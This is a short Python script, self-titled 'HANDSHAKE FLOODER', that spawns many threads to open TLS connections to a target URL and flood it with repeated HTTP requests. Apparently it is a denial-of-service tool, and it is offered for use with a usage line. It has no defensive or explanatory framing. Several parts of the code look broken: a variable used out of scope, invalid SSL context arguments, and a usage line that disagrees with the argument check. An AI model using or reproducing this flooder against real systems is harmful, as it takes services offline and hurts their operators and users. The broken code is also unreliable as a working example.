import socket,ssl,threading,struct,sys
from MODEL.data import generate_url_path,get_target
def Rapid_sender(s,byt):
   try:
    s.connect((target['host'],int(target['port']))); s.connect_ex((target['host'],int(target['port']))); s = ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1_1,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_SSLv23).wrap_socket(s,server_hostname=target['host'])
    for _ in range(500):
     s.write(byt[0]); s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1)); s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,struct.pack('ii', 0, 1)); s.write(byt[1])
    s.shutdown(socket.SHUT_RDWR); s.close()
   except:pass
def Rapid(target,meth):
  try:
    [threading.Thread(target=Rapid_sender,args=(socket.socket(socket.AF_INET, socket.SOCK_STREAM),[f"{meth} {a} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()for a in ['/'+generate_url_path(num=1),target['uri']]])).start()for _ in range(500)]
  except:pass
url = '';meth = ''; thread = 0
if len(sys.argv) == 4:url,thread, meth = sys.argv[1], int(sys.argv[2]), sys.argv[3]
else:print(f'WELCOME TO HANDSHAKE FLOODER\n{sys.argv[0]} <URL> <THREAD> <TIME> <METHODS>')
target = get_target(url)
for _ in range(thread):[threading.Thread(target=Rapid,args=(target,meth)).start() for x in range(10)]
